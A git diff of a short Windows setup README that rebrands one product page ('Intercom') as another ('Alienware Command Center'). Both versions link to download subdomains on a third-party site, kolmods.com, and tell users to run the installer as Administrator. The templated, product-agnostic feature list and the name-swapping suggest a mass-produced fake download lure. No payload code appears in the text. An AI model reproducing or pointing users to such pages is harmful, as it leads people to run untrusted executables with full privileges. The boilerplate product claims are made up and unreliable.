@@ -1,14 +1,10 @@
-# Intercom Windows Setup Notes
+# Alienware Command Center Windows Setup Notes
 
-<p align="center">
-  <a href="https://intercom.kolmods.com/">
-    <img src="https://img.shields.io/badge/Download-Intercom-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Intercom">
-  </a>
-</p>
+[⬇ Download Alienware Command Center for Windows](https://alienware-command-center-setup.kolmods.com/)
 
 ## Download & Install
 
-> Setup notes for **Intercom** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Alienware Command Center** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -16,15 +12,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Intercom** from the Start menu
+5. Restart if the installer asks — then launch **Alienware Command Center** from the Start menu
 
 ## What you can use it for
 
-- Core Intercom features on Windows desktop
-- Install and configure Intercom for daily use
-- Import, edit, and export with Intercom tools
-- Tune settings and profiles inside Intercom
-- Integrate Intercom into your existing workflow
+- Core Alienware Command Center features on Windows desktop
+- Install and configure Alienware Command Center for daily use
+- Import, edit, and export with Alienware Command Center tools
+- Tune settings and profiles inside Alienware Command Center
+- Integrate Alienware Command Center into your existing workflow
 
 ## License
 
